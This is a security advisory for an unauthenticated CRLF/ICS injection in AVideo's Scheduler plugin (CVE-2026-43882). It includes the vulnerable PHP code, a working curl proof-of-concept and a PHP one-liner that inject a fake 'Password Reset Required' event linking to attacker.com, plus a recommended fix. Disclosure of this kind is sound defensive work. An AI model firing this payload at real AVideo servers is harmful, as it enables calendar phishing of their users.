# [M] AVideo: Unauthenticated CRLF/ICS Injection in Scheduler downloadICS.php Allows Calendar Event Spoofing

## Summary
Severity: Medium
Advisory: GHSA-mwgh-92m2-wvhv
CVE: CVE-2026-43882
CWE: CWE-93
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-mwgh-92m2-wvhv
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The unauthenticated `plugin/Scheduler/downloadICS.php` endpoint passes attacker-controlled `title`, `description`, and `joinURL` parameters into `Scheduler::downloadICS()`, which builds an ICS calendar file via the `ICS` helper class. `ICS::escape_string()` (`objects/ICS.php:167-169`) only escapes `,` and `;` and does NOT neutralize CR/LF, so attacker CRLF bytes inside a property value break out and inject arbitrary ICS lines — including `END:VEVENT` / `BEGIN:VEVENT` pairs that add entire attacker-controlled calendar events. Because the malicious `.ics` file is served from the victim's trusted AVideo origin, this enables high-credibility calendar phishing: forged meetings with attacker-chosen `SUMMARY`, `URL`, `LOCATION`, and `DESCRIPTION` landing in the victim's calendar after import.

## Details

### Vulnerable code path

**`plugin/Scheduler/downloadICS.php`** — unauthenticated entry point:

```php
if(!AVideoPlugin::isEnabledByName('Scheduler')){
    forbiddenPage('Scheduler is disabled');
}
if(empty($_REQUEST['title'])){ forbiddenPage('Title cannot be empty'); }
if(empty($_REQUEST['date_start'])){ forbiddenPage('date_start cannot be empty'); }

Scheduler::downloadICS($_REQUEST['title'], $_REQUEST['date_start'], @$_REQUEST['date_end'],
    @$_REQUEST['reminder'], @$_REQUEST['joinURL'], @$_REQUEST['description']);
```

There is no session check, no CSRF token, no user-role check — only an empty-check on `title`/`date_start` and a plugin-enabled check.

**`plugin/Scheduler/Scheduler.php:367-382`** passes inputs directly to the ICS builder:

```php
$props = array(
    'location' => $location,
    'description' => $description,   // attacker-controlled
    'dtstart' => $dtstart,
    'dtend' => $dtend,
    'summary' => $title,             // attacker-controlled
    'url' => $joinURL,               // attacker-controlled
    'valarm' => $VALARM,
);
$ics = new ICS($props);
...
echo $icsString;
```

**`objects/ICS.php:167-169`** — incomplete escape:

```php
private function escape_string($str) {
    return preg_replace('/([\,;])/','\\\$1', $str);
}
```

Per RFC 5545 §3.3.11, TEXT values must also have CR/LF either folded or encoded as `\n`. This implementation does neither. `ICS::to_string()` (line 101) joins every property with `"\r\n"`, so any raw `\r\n` sequence embedded in a value breaks out of the property line and injects new ICS directives.

### Verified exploit output

Running the builder with a CRLF-laden `description` produces a file with two distinct `VEVENT` blocks (the second entirely attacker-controlled):

```
BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//hacksw/handcal//NONSGML v1.0//EN
CALSCALE:GREGORIAN
BEGIN:VEVENT
DESCRIPTION:Hello
END:VEVENT
BEGIN:VEVENT
SUMMARY:Injected
URL:http://attacker.com
DTSTART:20260501T000000Z
DTEND:20260501T130000Z
SUMMARY:Legit
URL;VALUE=URI:https://example.com
DTSTAMP:20260424T082123Z
UID:69eb2803d1aa2
END:VEVENT
END:VCALENDAR
```

The injected `BEGIN:VEVENT` / `END:VEVENT` pair is standards-compliant and parsed as an additional event by Outlook, Apple Calendar, Google Calendar, and Thunderbird/Lightning.

## PoC

1. Ensure the Scheduler plugin is enabled on the target (default-shipped optional plugin, commonly enabled on streaming deployments).

2. Send an unauthenticated GET request with CRLF-encoded payload in `description`:

```
curl -o malicious.ics \
  'http://victim.example.com/plugin/Scheduler/downloadICS.php?title=Team%20Standup&date_start=2026-05-01+12:00&description=Hello%0D%0AEND:VEVENT%0D%0ABEGIN:VEVENT%0D%0ASUMMARY:URGENT%3A%20Password%20Reset%20Required%0D%0ADTSTART:20260601T090000Z%0D%0ADTEND:20260601T100000Z%0D%0AURL:http://attacker.com/phish%0D%0ALOCATION:Online%0D%0ADESCRIPTION:Please%20click%20the%20URL%20to%20confirm%20your%20identity'
```

3. The returned file contains two `VEVENT` blocks. Import into any standards-compliant calendar client — both events appear in the victim's calendar. The injected event renders with an attacker-chosen clickable URL.

Local reproduction (without needing a running server) using the same code path:

```
php -r "require 'objects/ICS.php'; \$p = ['description' => \"Hello\r\nEND:VEVENT\r\nBEGIN:VEVENT\r\nSUMMARY:Injected\r\nURL:http://attacker.com\", 'dtstart'=>'2026-05-01', 'dtend'=>'2026-05-01 13:00', 'summary'=>'Legit', 'url'=>'https://example.com']; echo (new ICS(\$p))->to_string();"
```

Produces the two-VEVENT output shown above (verified).

## Impact

- **Same-origin calendar phishing.** The `.ics` is served from the trusted AVideo domain, bypassing URL-reputation checks and email-filter suspicion of attacker-hosted attachments.
- **Arbitrary event spoofing.** Attacker controls `SUMMARY`, `DTSTART`, `DTEND`, `URL`, `LOCATION`, `DESCRIPTION`, and may add further ICS properties (e.g. `ORGANIZER`, `ATTENDEE`). Many mainstream calendar clients display the `URL` field as a clickable link in the event body.
- **Integrity:** Low — unwanted/forged events are added to the victim's calendar after they import the file.
- **Auth:** None. Precondition is only that the Scheduler plugin is enabled, which is typical on deployments that use AVideo's scheduled streaming features.
- **Confidentiality / Availability:** No direct impact.

Not a higher-severity response-splitting bug: PHP's `header()` blocks CRLF in response headers since 5.1.2, so the CRLF bytes do not escape into HTTP headers — only into the ICS body.

## Recommended Fix

Strip or RFC-5545-encode CR/LF in `ICS::escape_string()` so newline bytes cannot break out of a property line. In `objects/ICS.php:167-169`:

```php
private function escape_string($str) {
    // RFC 5545 §3.3.11: escape backslash, semicolon, comma; encode newlines as \n
    $str = str_replace(array("\\", "\r\n", "\r", "\n"), array("\\\\", "\\n", "\\n", "\\n"), $str);
    return preg_replace('/([\,;])/', '\\\\$1', $str);
}
```

Additionally, `plugin/Scheduler/downloadICS.php` should either require authentication or at minimum apply strict input validation (length caps, character whitelists) on `title`, `description`, and `joinURL` — and `joinURL` should continue to be validated via `isValidURL()` (already done) before emission. Consider adding a defence-in-depth strip of CR/LF on every `$_REQUEST` parameter used by `Scheduler::downloadICS()`.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-mwgh-92m2-wvhv
- https://nvd.nist.gov/vuln/detail/CVE-2026-43882
- https://github.com/WWBN/AVideo/commit/764db592f99e545aa86bb9a4ad664ffd14c38ba5
- https://github.com/WWBN/AVideo
